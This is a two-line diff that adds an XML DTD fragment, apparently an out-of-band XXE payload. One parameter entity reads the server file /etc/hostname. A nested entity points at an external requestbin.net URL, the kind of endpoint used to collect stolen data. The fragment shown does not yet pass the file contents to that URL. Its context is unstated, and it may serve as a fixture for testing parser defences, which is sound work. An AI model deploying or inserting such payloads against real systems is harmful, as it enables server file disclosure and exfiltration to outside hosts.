@@ -1,0 +1,2 @@
+<!ENTITY % three SYSTEM "file:///etc/hostname">
+<!ENTITY % two "<!ENTITY % four SYSTEM 'http://requestbin.net/r/1lqi41c1'>">
